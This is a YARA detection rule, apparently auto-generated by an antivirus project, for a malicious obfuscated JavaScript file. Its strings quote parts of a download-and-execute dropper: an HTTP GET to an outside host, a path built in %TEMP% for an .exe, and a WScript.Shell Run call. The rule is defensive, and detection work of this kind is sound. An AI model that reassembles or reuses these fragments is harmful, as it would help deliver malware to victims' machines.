rule sig_20160330_33859bacbffd36d4145ee3fb3ec646a9 {
  meta:
    description = "datamaliciousorder - file 20160330_33859bacbffd36d4145ee3fb3ec646a9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ee13c0d7e9de20ea4d2dccab8b9b8b25bcf9b7ecc711f4142934571c9a0bb03b"

  strings:
    $s1  = "_R[_E](\"GET\", \"http://susiewest.com/u2w7q\", false);" fullword ascii
    $s2  = "function _WJ(_QJ, _M1){_O = _O * 1; return _QJ - _M1;};" fullword ascii
    $s3  = "var _P = function _KN() {return WScript[_M0](\"WScript\"+\".Shell\");}(), _OT = 11;" fullword ascii
    $s4  = "if (_R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _S() {return _P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Z5SR3IPlRlwlcsSE.ex\" + \"e\";};" fullword ascii
    $s6  = "function _TB(){return _RD + \"\";};" fullword ascii
    $s7  = "function _J(_FS){_P[\"Run\"](_FS, _O, _O);};" fullword ascii
    $s8  = "function _T() {return ((_AU == true) && (_AU == _A)) ? 1 : _O;};" fullword ascii
    $s9  = "function _DB(){return _M0;};" fullword ascii
    $s10 = "var _J0 = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_EA){" fullword ascii
    $s12 = "function _M()" fullword ascii
    $s13 = "function _SQ(){return 22;};" fullword ascii
    $s14 = "function _V(_K) {var _G = (1, 2, 3, 4, 5, _K); return _G;};" fullword ascii
    $s15 = "return _WJ(_PF, _OP);" fullword ascii
    $s16 = "var _T0 = false;" fullword ascii
    $s17 = "var _A = false;" fullword ascii
    $s18 = "_A = true; " fullword ascii
    $s19 = "_AU = true; " fullword ascii
    $s20 = "var _AU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}